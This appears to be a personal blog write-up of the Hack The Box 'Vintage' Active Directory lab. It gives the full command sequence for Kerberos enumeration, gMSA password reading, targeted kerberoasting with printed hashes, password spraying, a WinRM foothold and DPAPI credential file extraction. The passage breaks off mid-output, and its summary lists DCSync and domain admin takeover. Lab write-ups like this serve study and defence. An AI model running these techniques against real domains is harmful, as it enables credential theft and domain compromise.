---
layout: post
title: "vintage"
date: 2025-10-23 
categories: CPTS Playlist
---
# vintage

# Summary

- nxc reveal NTLM authentication is not enabled; need kerberos authentication
- create pertinent /etc/krb5.conf so we can request ticket from valid domain users
- kinit to request ticket
- bloodhound-python to map out AD
- AD-miner reveal Pre 2000 Windows Computer; these computers normal credential is the same as the computer name
- fs01$ has gmsa read privilege; bloodyAD msDS-ManagedPassword attribute to read NTLM password for gmsa01$
- gmsa01$ has GenericWrite over ServiceManagers (add self to group bloodyAD); which have GenericAll over service accounts
- Enable svc_sql account, then perfrom targetdKerberoast on all service accounts; crack TGS hash with hashcat
- One service account password cracked; password spray with nxc; c.neri reuses the same password
- c.neri is part of Remote Management Users; evil-winrm to get foothold; find RDP file in Documents
- transfer encrypted master key file from DPAPI and credential file; use pypykatz generate prekey from user SID and password; prekey to decrypt master key; decrypt credential file; find new credential for c.neri_adm
- c.ner_adm part of DelegatedAdmin Group; add a SPN account (FS01$) to DelegatedAdmin with bloodyAD; request TGS to impersonate DC01$ with FS01$ using get-ST; export kerberos ticket
- secretsdump to DCSync; get all users’ NTLM hash including domain admin
- getTGT to get domain admin ticket; evil-wirnm on to domain admin session

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/vintage 10.10.11.45

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-22 13:21:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the open ports, this look like a Active Directory domain controller. Let’s add the domain name and host name to our /etc/hosts file:

```bash
10.10.11.45 vintage.htb DC01.vintage.htb
```

We are given the account:

```bash
P.Rosa:Rosaisbest123
```

## SMB

Let’s first enumerate the smb shares:

```bash
nxc smb 10.10.11.45 -u P.Rosa -p Rosaisbest123 --shares

SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

Maybe NTLM is not supported. Let’s edit our /etc/krb5.conf so we can request a kerberos ticket. 

```bash
[libdefaults]
        default_realm = VINTAGE.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

        fcc-mit-ticketflags = true

[realms]
        VINTAGE.HTB = {
                kdc = DC01.vintage.htb
                default_domain = vintage.htb
        }

[domain_realm]
        .vintage.htb = VINTAGE.HTB

[appdefaults]
        forwardable = true
                pam = {
                        VINTAGE.HTB = {
                                ignore_k5login = false
                                }
                }
```

Now let’s use kinit to get a TGT:

```bash
kinit P.Rosa

#enter password for P.Rosa
```

Now verify our ticket:

```bash
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
10/22/2025 09:41:25  10/22/2025 19:41:25  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 10/23/2025 09:41:19
```

Let’s enumerate smb again:

```bash
export KRB5CCNAME=/tmp/krb5cc_1000

nxc smb DC01.vintage.htb --use-kcache --shares

SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC01.vintage.htb 445    DC01             [+] VINTAGE.HTB\P.Rosa from ccache 
SMB         DC01.vintage.htb 445    DC01             [*] Enumerated shares
SMB         DC01.vintage.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.vintage.htb 445    DC01             -----           -----------     ------
SMB         DC01.vintage.htb 445    DC01             ADMIN$                          Remote Admin
SMB         DC01.vintage.htb 445    DC01             C$                              Default share
SMB         DC01.vintage.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.vintage.htb 445    DC01             NETLOGON        READ            Logon server share 
SMB         DC01.vintage.htb 445    DC01             SYSVOL          READ            Logon server share
```

We could’ve also read the shares without using kinit and just used the full `-k` option on nxc for aKerberos-only authentication by performing the full Kerberos handshake (AS-REQ/AS-REP) to obtain a TGT using provided credentials.

```bash
nxc smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

Let’s read NETLOGON:

```bash
nxc smb DC01.vintage.htb --use-kcache --spider NETLOGON --regex .

SMB         DC01.vintage.htb 445    DC01             [+] VINTAGE.HTB\P.Rosa from ccache 
SMB         DC01.vintage.htb 445    DC01             [*] Started spidering
SMB         DC01.vintage.htb 445    DC01             [*] Spidering .
SMB         DC01.vintage.htb 445    DC01             //DC01.vintage.htb/NETLOGON/. [dir]
SMB         DC01.vintage.htb 445    DC01             //DC01.vintage.htb/NETLOGON/.. [dir]

```

Nothing.

## Bloodhound

Since we have a valid domain account, let’s map out the AD with bloodhound

```bash
bloodhound-python -u P.Rosa -p 'Rosaisbest123' -ns 10.10.11.45 -d vintage.htb -c all 
```

Now let’s start bloodhound and upload our json data:

```bash
sudo neo4j start
bloodhound
```

Searching up our user, we do not see any privileges, we are just a regular domain  user:

![image.png]({{ site.baseurl }}/assets/vintage/image.png)

Let’s look for kerberoastable accounts:

```bash
nxc ldap DC01.vintage.htb --use-kcache --kerberoasting kerberoasting.out

LDAP        DC01.vintage.htb 389    DC01             [+] vintage.htb\P.Rosa from ccache 
LDAP        DC01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        DC01.vintage.htb 389    DC01             [*] Total of records returned 0
```

## Find domain users

Let’s use rpcclient to get valid domain users:

```bash
rpcclient -U "VINTAGE.HTB\P.Rosa%Rosaisbest123" DC01.vintage.htb

rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Rossi] rid:[0x457]
user:[R.Verdi] rid:[0x458]
user:[L.Bianchi] rid:[0x459]
user:[G.Viola] rid:[0x45a]
user:[C.Neri] rid:[0x45b]
user:[P.Rosa] rid:[0x45c]
user:[svc_sql] rid:[0x46e]
user:[svc_ldap] rid:[0x46f]
user:[svc_ark] rid:[0x470]
user:[C.Neri_adm] rid:[0x474]
user:[L.Bianchi_adm] rid:[0x475]

```

Now filter for only the usernames:

```bash
grep '^user:' users.txt | sed 's/user:\[\(.*\)\] rid:\[.*\]/\1/' > valid_users.txt
```

We can use kerbrute and perform a password spray to see if P.Rosa’s password is reused:

```bash
./kerbrute passwordspray -d vintage.htb valid_users.txt 'Rosaisbest123'

2025/10/22 10:23:21 >  [+] VALID LOGIN:  P.Rosa@vintage.htb:Rosaisbest123
2025/10/22 10:23:21 >  Done! Tested 14 logins (1 successes) in 0.161 seconds

```

Or password spray with nxc:

```bash
nxc smb DC01.vintage.htb -u valid_users.txt -p Rosaisbest123 --continue-on-success -k

SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)       
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\Administrator:Rosaisbest123 KDC_ERR_PREAUTH_FAILED                        
<SNIP> 
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi_adm:Rosaisbest123 KDC_ERR_PREAUTH_FAILED 
```

We could also use the —users flag to find out additional information about the users:

```bash
nxc smb DC01.vintage.htb --use-kcache --users

SMB         DC01.vintage.htb 445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                   
SMB         DC01.vintage.htb 445    DC01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
SMB         DC01.vintage.htb 445    DC01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain
SMB         DC01.vintage.htb 445    DC01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
SMB         DC01.vintage.htb 445    DC01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             L.Bianchi                     2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             G.Viola                       2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             C.Neri                        2024-06-05 21:08:13 0        
SMB         DC01.vintage.htb 445    DC01             P.Rosa                        2024-11-06 12:27:16 0        
SMB         DC01.vintage.htb 445    DC01             svc_sql                       2025-10-22 14:52:04 0        
SMB         DC01.vintage.htb 445    DC01             svc_ldap                      2024-06-06 13:45:27 0        
SMB         DC01.vintage.htb 445    DC01             svc_ark                       2024-06-06 13:45:27 0        
SMB         DC01.vintage.htb 445    DC01             C.Neri_adm                    2024-06-07 10:54:14 0        
SMB         DC01.vintage.htb 445    DC01             L.Bianchi_adm                 2024-11-26 11:40:30 0 
```

Notice 3 users have their passwords set at the same time; this could be an indication of a script setting up these users, which could suggest password reuse or weak passwords.

```bash
SMB         DC01.vintage.htb 445    DC01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         DC01.vintage.htb 445    DC01             L.Bianchi                     2024-06-05 13:31:08 0 
```

## LDAP

Let’s search for user descriptions

```bash
nxc ldap DC01.vintage.htb --use-kcache -M user-desc 

User:                     Description:
Administrator             Built-in account for administering the computer/domain
Guest                     Built-in account for guest access to the computer/domain
krbtgt                    Key Distribution Center Service Account
```

```bash
ldapsearch -H ldap://vintage.htb -Y GSSAPI -b "DC=vintage,DC=htb"
```

## DNS

Let’s get DNS records:

```bash
nxc ldap DC01.vintage.htb --use-kcache -M get-network -o ALL=true

dc01.vintage.htb         10.10.11.45
```

## Pre-Windows 2000 Computers

Going back to bloodhound, let’s use another tool ADMiner:

```bash
AD-miner -u 'neo4j' -p 'PASSWORD' -cf vintage

[+] Done in 9.93 s! Program finished. Report generated in render_vintage

cd render_vintage

open index.html

```

![image.png]({{ site.baseurl }}/assets/vintage/image%201.png)

Hovering over the yellow hexagon on the upper-half-left, we see Pre-Win 2000.

![image.png]({{ site.baseurl }}/assets/vintage/image%202.png)

We click into it:

![image.png]({{ site.baseurl }}/assets/vintage/image%203.png)

Going back to Bloodhound:

![image.png]({{ site.baseurl }}/assets/vintage/image%204.png)

It confirms our group membership. Pre-Windows 2000 is known to be setup with password that matches the computer name; more can be found in this article: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts

Let’s test if the computer password is the same as the computer name; since this is a computer account, we add the $ sign at the end:

```bash
nxc smb dc01.vintage.htb -u FS01$ -p fs01 -k --shares

SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\FS01$:fs01
```

The password matches.

## Lateral Movement

Checking the privileges of FS01, we find we have read GMSA password; This allows us to read the GMSA01$’s NTLM password

![image.png]({{ site.baseurl }}/assets/vintage/image%205.png)

```bash
nxc ldap dc01.vintage.htb -u FS01$ -p fs01 -k --gmsa
```

This does not work as it attempts to connect to LDAPS. Let’s try bloodyAD:

```bash
bloodyAD -d vintage.htb -u fs01$ -p fs01 -k --host dc01.vintage.htb get object gmsa01$ --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38
msDS-ManagedPassword.B64ENCODED: 2AWPGtq5oeMIDA4gk+mihiGnbcc34aLR2KvVBj6sHj+YifC0cJAdAmhaomIRfAWc9giDMOUYF9n+FnJkvn3rci7FtIT5Ug9wjMwL9mKl78WjaWSTpGkBFja8TtL2Gs9skg/Ma0gfckV/w5FJx1BODB9s3ty1nS/LY+/omWpXfJ8w4QF1JqqL0nLBBqMQJ4wrZmhxbkQ91O6Vk6H5DdptMaUOVSh0Y3kuYB4zyp6V4vVIdno6UpbZsJ3Sdx/ep2j8F3xlj+zK/XHcP0eUJeahloCHx4PoltgKBvy0UDP3wXJmf2MvW/dhw9ErBlHZhq7cpXCIjkAoxTB8Cs/j6csEgg==
```

```bash
gmsa01$:3cc51fff9dfca7dc208252d1c570bb38
```

Verify:

```bash
nxc smb dc01.vintage.htb -u gmsa01$ -H 3cc51fff9dfca7dc208252d1c570bb38 -k 

SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\gmsa01$:3cc51fff9dfca7dc208252d1c570bb38 
```

Checking gmsa01$’s privilege, we are part of the ServiceManagers Group:

![image.png]({{ site.baseurl }}/assets/vintage/image%206.png)

Let’s add ourself with bloodyAD:

```bash
bloodyAD -d vintage.htb -u gmsa01$ -p 3cc51fff9dfca7dc208252d1c570bb38 -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers gmsa01$

[+] gmsa01$ added to ServiceManagers
```

ServiceManagers have GenericAll rights over three service accounts. 

![image.png]({{ site.baseurl }}/assets/vintage/image%207.png)

All but svc_sql accounts are enabled:

![image.png]({{ site.baseurl }}/assets/vintage/image%208.png)

But since we have GenericAll rights, we can enable the account. At this point we could forceChangePassword on all accounts and get their rights, but because theses service accounts have no additional rights, it might be more beneficial for us to perform keberoasting on these accounts and crack their passwords. First, let’s enable svc_sql; since we have only have gmsa01$’s NT hash, we cannot use kinit; let’s use impacket-getTGT to get our ticket:

```bash
impacket-getTGT 'vintage.htb/gmsa01$' -dc-ip 10.10.11.45 -hashes :3cc51fff9dfca7dc208252d1c570bb38 

[*] Saving ticket in gmsa01$.ccache

```

Now let’s export the ticket:

```bash
export KRB5CCNAME='gmsa01$.ccache'
```

Now let’s enable svc_sql account:

```bash
bloodyAD -d vintage.htb -u gmsa01$ -p 3cc51fff9dfca7dc208252d1c570bb38 -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

Now let’s perform kerberoasting:

```bash
python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb 

[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$133f24b68b5d00e3bd8dc506ceba1169$83d496ea4b32bf2a760eba1f126ce88ab052f4ff19b9e3234dbdbafd005e56d6a1c693743d461e6992dcd44da90ba0494beaeae4f339140085fe1aee0ccae01d3e30b3840ac961cdc531f1fa00720f9d9e3cc5e7b03598aef4942d69f5384aa009431c4e5497ca664f78afb94df15ad1eb67799627217c842c44d462928ddf48c41554e0ac36a087488422c2812f9e8076db720459852fe83dae309299c36afd851511f60011925221216ba991ae6ac6cb6f4667df0dcc3fa95e37f86d5b498e6dad3d0dd193c4544fff4d9c34d0639b57ca882447d7d773e2932599b01173339711ff1ff6c9507fb5a9662a0488044dc0a221e5746e09a43e78c1f1556c06600e365112959aed26e1f10794e0c5e5dff7486d1f5904870ed7a754afeb6d245049ac9a88dcd0be5a57581b528094ab84acfd3859daa1e2d78b361bbbeaac292b0879046643fdbd64b923a1e8a91cbb60e930e2744a202751d1ca7886b1d7afbf70677f4f58a5012f298169162860bb17ecf16c3f002182d3fbe4d6f5c61755a63dfd22c2154c182b5c320956d53d7e6dc9d258167e2ae14bef30bc45ac7db3cd760d1b97080ef6333fd1322f0eeff96ea3ae8fcc431f27d7833210f250c6314e5a9a76833caf55276a1077144b82b992a4443145550bec5715ec968dd354ec689c1c20c6dc45d3eee35a9fa951a18eb922bb8c8293a3c591ae87c54d0f36ce44b81ced62e49df8697fb4c18e59ae1d478ff1f8046e81d62a68a3dcc706aca956af12b6b95531ec34c82ef55f35ca3a58e5cd142218657b838f0a49f22e33fe8d8ab1c66343d3bddbc22845d05dc91fe88b0f6b2f4abab6a6b686bc728e1bdf3805da3405d4b2d26e300da7e1dd5a4c7b9bc38396e5b3569de3657f94debd046912f703f8d208e82f5d80b522e5358787093812a7a0ea1a6b32a56e2e7fb762534080c279a1f19d04a3e786434c614e0b181b63bc085edd42ce5308dd2f3f08402d4c2d081182a61761ba6e5fe512ee600d1e2f5d6521fdfa21ab8deea32e867cc64f21675909795708246db0284837848072e6df2c6963cec3d3d0ff96daec6d40a3187ca95ccf3e363003d323b926d785d15e878d49b4bc0cf1c8cc9b7c0df889c944f5d99b65bb42a5668245b8d865477512b64e4f14ec6e2d34c7d492c11a02766cd295d6ffb2204aa7a412f424132a8fc707cb642fad4450ca731a58971c18b2f6ab9c49db8570b7a74fe854d727bd50e072f19a4437a22f9cd0275e6ae3f71f32c5310fa3b39cbfe8f4e6bbeb25a8a09c24b4fe36e10416e0907fc46a49ecab511c2bcab246490c3e81aae19fc4e36558ad193bc1ec490419d7d2adf8d35d7c1d8726d8cc51d9de5f461b337b108fda6b4f64d8859b98b435d633b493794f4712ab9afe8c63732d6b69297608e27fb479e4045bb33ae72e839c4b555fdd0211f6
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$15559dd2a6bb501397f7115ca507eac8$86d2d26bbff87453d01a55b3ad8bf16c19c94af83fb3d2ad6b90c96bf32fe63ea3039276f9fa50f4890394101d6b5dbd4c7e3425f1ce483cd202411da2c0c42e1f552044ce561f8df4e30d4ff76da2641e5b8b5d8de0091eefa04cec950c6a7f9da940ade0431a8c5ee72297680df6aae8f1eea9b137581077782dfd4f49b29f1c4e8ba16637dde7a5510b2d7e3a9f8793e72db4c32298b69c4ad418e35791758025e503645cf35ed364f2085c09f5717b432ced967799cb660e9789f30252fba68702faefc10ba958bb7573f286d23c43c73a3a81c6ac4797bc71606d75697bb5b149f4639a592fd4b385632bd27b9175f8ba5540f44e50719775a9acbb93bb43110fbb9ffcf1556ba45a6dec5ec5d3a75a23f70f17d2ba7586b20a9634ef0bfb093db9d89f8814ebadd51ff6a349a82d0dc5ee9680ce7d0573fe935b9a923d8ea17b9906c6c9ff5671f783cfe588355e5e9a60df61c6881b588ccb3075af82697fa89bae9d667a593526fa5224945958d0e4a037e7149a9f33f23127d292aa634b5f6263ee28258988a2bc51c66f1e4b72b16a1639e1652d2b3c06f0682e0a58afebc38334a4c06298624fe3f1989a8a30636d29713e5b20db119fb671491b4972f3242d9aa845af4837521b805a7891cb1a7693a3616aea27e24235075778040868be6d498055ff3953456a83eba11993cadd6922c0af46362af4eaec1b31bdbbb64f161faed5d3f5a6209cdd71b598b9ce573610d5af90e0e516e46827a97e03560105f0e838ea51ac60b5e31a65db84fa432aa9538c8a5ac9a3f2b654c5130d1711afecc3c3af82f84ce8bbcc75af29537a4ec9779792bc06f067d6114787d1559c2f896135cece8b30870295b27ad43b566f03f009b5bc02052e8384a6776e97c52c0565cca401dc667c791f1be2d83b170d9ed41801fee51b4b67fddd2a7f5d44fcc3e70aa0dd17bdf35afa215246177dd51d71f414a0c176aac724156b7989af3ed8ce02c5cdef6cc53621d97a271fbd26cd5eb55dee18cb095363dfd1246cfe664ba808dd815d4fd7c0592987161bb132c1afd3dd4253d4b518c01b61641480fc5622feccba84895ea4c4c45edc8ef7731c8f047e427ef6ed1bf2a30c4f84d9c513cb94b8241a0ff91574b1d5a5a6a738645e494862f5492d5086c9417a631ce9b5b7c384c680cd4d18fc4e12495fee1a43d846d45adb4aa399b949e725fb14d9470b1cfae31d8fdaaea2637b8fe4e5a8f79ac8365640865f864ea0c687bd3356774c3762cea30224c448e3d381647998964881ca50f5052d70817af08749326070c001b9ad45cd5d463281bf08aea5b7c503310002f30893a5853055a11a8a0b3a382c7fd34bfec677fc5f3a6a1a6c2f879b6a0ed75acc9ece37caf0fc259b885d530c9e32a2b30cdadc7615b9fa5239c8285ab62be80f5365cce20e921e
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$aaee4a79e23472aea1ba5108be4370d8$c4d48135d67e55600320b21702dccd66f423f207e481eb39838100907b605a1f225a8e693be383223139ac81d4732a5bcee695c041abf5f52d62df99ac7613d4ecc6924517aa50159a8883e44d4b92ab6c64f1b8fd890966a1ff3bfd5a3592816026ebb27de5f368cb9e44a6ec9b5fd772c7c1b549f719aded09994c7ec7585d2fe571e865e31cace1d7ba9259d6173eed9b0563d12e6c1f3bb194528e44d7915010fb77d1eb0cee77634d0ddebbd42738e6b8c29cfa31592d9cb5ba2f098c79ce5d528926022af9c3cae2ba82462d80517d5259698b1472c9199ec0fec67981be6ed85f56c3356de4729fb1ef2f4d59ded7fb4c7f51a7724e371aef466400e8b07a7e8842284fd996d3a3c68e47653959e22b592e4af340bb3019eb7402db87c1e3d6e70bcb61cb6308a20ea05d36a7dc97ccf00d23e8c235395aa617906dd133ed1fa9b5c6ab301170e16b2fa5c08a68b4b9e82b0a548e343bd8ccb6786eefbb37a48007f21abd9612835d721a3f9468281e6c725de4fb6ca533cdd7c8f447d06614e2c657a1b79c0203e673961a1cb6fec599d6d0e12a8e072eb87010680b8b9de8903ed5e880f95634ba2e3f1ecd91a17ef396aa26b1be56bb127c0685f66fa678f585fb4ff2be6e9dea0d6705d4f88d5a267fd7bc6d388d41bcab16fdc3fc9e5110c9fbf2c123a1145ada656867733e7bdd5380a34752c06b1d2c6838016d200868824a0ceb09aeeabb6d72833b13228fff1a486f40b8e93822322a7b5d00c382d36f237741d258d69d014de2b3903c959abe946cf1939f9e9a7bc5f6eb5cd23ac9554fd996bc730114fdccb55886ffb73a7423b58f8b239ffae787171d61b4002da15b17726b6dca7d788a1f8a5941bbfe86f7c0762ac3faddc1eaf5b81cc4706cb1703b8f8a2198eab700b25852975f353174a8d3a526b6bec646e06cc277e5c14d78215cc57544e9d0cb4eb99c978e90236ff2b72cb914748b8ee41852f64281876c9d433be25a2db5e824f366a51adaac4c81102b047aeae7f08427c97715e6585fe911092d15f66d7e4e1cdf7be2eabca8b3561889b64dd206f0247bec7383fa3ed0aab8915c8e75bd91a0efca6ede6fbc4f5d55c2c9f1fe94e54075e7ae7abc45bad9bf5b49d69c33ead3c2a88de04657ed43f943122fb2068969bc60ea89c29f2a4db5ccc1cfcd2739835a99c2630fbecbf0eec16daf02dc4ae10e43c57a792119e04a45a2b7f26f85c54b85b51771f176f1d824cf7482d91cbb3b8c93979e0ac0c6c1e776c408f0b0b048bced9ea849fcdb04256f0454f143f9d98dd19b371144e2b8e33cf7ccd24bf3be209459658f504968a02dd343b950f942393e7e41b2d37e1acbabdfbff23f71c047cd752144664dc1a0d0250016d4b1ed2ea772436d3c95945eb4c3615f0adb9fa7c9079e75f8c181fa0591f5bd30b3737c2a

```

The reason why we could not kerberoast these service accounts previously is because SPNs are not set. If we want to, we can setSPN with bloodyAD to all the service accounts; e.g.

```bash
bloodyAD -d vintage.htb -u gmsa01$ -p 3cc51fff9dfca7dc208252d1c570bb38 -f rc4 --host dc01.vintage.htb -k set object svc_sql servicePrincipleName -v 'http/sql'
```

Then we can kerberoast with nxc. Let’s crack the TGS hashes. First, put them into a file:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt

svc_sql:Zer0the0ne
```

Only one service account cracked. Now let’s perform password spray and see if the password is reused:

```bash
nxc smb dc01.vintage.htb -u valid_users.txt -p 'Zer0the0ne' --continue-on-success -k

SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 

```

Let’s search up C.Neri’s privileges on bloodhound.

![image.png]({{ site.baseurl }}/assets/vintage/image%209.png)

We are part of the Remote Management group, which means we can PSRemote with evil-wirnm. When we searched up c.neri on bloodhound, we also see that there is an admin account:

![image.png]({{ site.baseurl }}/assets/vintage/image%2010.png)

Let’s get a ticket from C.Neri

```bash
unset KRB5CCNAME
kinit c.neri
```

Verify:

```bash
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri@VINTAGE.HTB

Valid starting       Expires              Service principal
10/23/2025 05:23:04  10/23/2025 15:23:04  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 10/24/2025 05:22:57
                                       
```

Now let’s evil-winrm:

```bash
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

## Privilege Escalation

In our Documents folder, we find a RDP file:

```bash
cd C:\Users\c.neri\Documents

ls -force

-a-h--          6/7/2024   4:05 PM           2336 Default.rdp
```

Checking our privileges:

```bash
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Not much. Let’s check our whether we are in constrained language:

```bash
$ExecutionContext.SessionState.LanguageMode

FullLanguage
```

Let’s check our powershell history:

```bash
type C:\Users\c.neri\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Nothing. Let’s upload SharpChromium to try and extract DPAPI secrets:

```bash
.\SharpChromium.exe logins

Program 'SharpChromium.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\SharpChromium.exe logins
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\SharpChromium.exe logins
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

We got blocked by Anti-Virus.

Let’s check for stored credentials manually. Let’s go into `%APPDATA%\Roaming\Microsoft\Credentials`

```bash
cd C:\Users\c.neri\AppData\Roaming\Microsoft\Credentials

ls -force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

```

Let’s download the file back to our host. First encode it in b64:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

Now copy it over to our host:

```bash
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```

Now decode it:

```bash
echo 'AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==' | base64 -d > C4BB96844A5C9DD45D5B6A9859252BA6 
```

We also need the master key to decode it; remember to note down our SID at this step:

```bash
SID: S-1-5-21-4024337825-2033394866-2055507597-1115

cd C:\Users\c.neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

ls -force

**Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred**

```

We have the credential key, let’s use pypykatz describe function so we know which master key to donwload:

```bash
pypykatz dpapi describe credential C4BB96844A5C9DD45D5B6A9859252BA6

== CredentialFile ==                                                                                                                           version: 1                                                                                                                                     
size: 418            
